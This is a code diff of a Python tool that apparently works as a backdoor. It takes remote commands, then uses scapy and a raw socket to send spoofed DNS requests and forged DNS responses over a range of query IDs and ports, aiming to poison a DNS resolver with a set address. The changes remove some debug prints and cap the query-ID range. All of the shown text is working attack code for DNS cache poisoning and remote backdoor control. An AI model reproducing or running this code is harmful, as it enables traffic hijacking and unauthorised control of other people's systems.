@@ -329,14 +329,12 @@ def fake_dns_responses(dns_port, dnsqids, qdsec, ansec, nssec, ip, total_respons
 
 def send_dns_requests(dnsPorts, ip, dns, dnsAddr, rawsock):
     for port in dnsPorts:
-        print("Sending request for port {}..".format(port))
         udp = scapy.UDP(sport=randomize_integer(), dport=port)
         request = ip / udp / dns
         rawsock.sendto(scapy.raw(request), (dnsAddr, port))
 
 
 def send_dns_response(response, dnsAddr, port, rawsock):
-    print("Sending fake response for port {}..".format(port))
     rawsock.sendto(response, (dnsAddr, port))
 
 
@@ -490,8 +488,13 @@ class Backdoor:
                         dnsAddr = command[4]
                         query = command[5]
                         dnsPorts = list(map(int, command[6].translate({ord(i): None for i in '[]'}).split(',')))
-                        dnsQids = list(range(int(command[7]), int(command[8])+1))
-                        print(dnsQids)
+                        start = int(command[7])
+                        end = int(command[8])
+                        if end > 65535:
+                            end = 65535
+                        dnsQids = list(range(start, end+1))
+                        print(start)
+                        print(end)
                         badAddr = "10.0.2.10"
 
                         ip = scapy.IP(src=nsAddr, dst=dnsAddr)
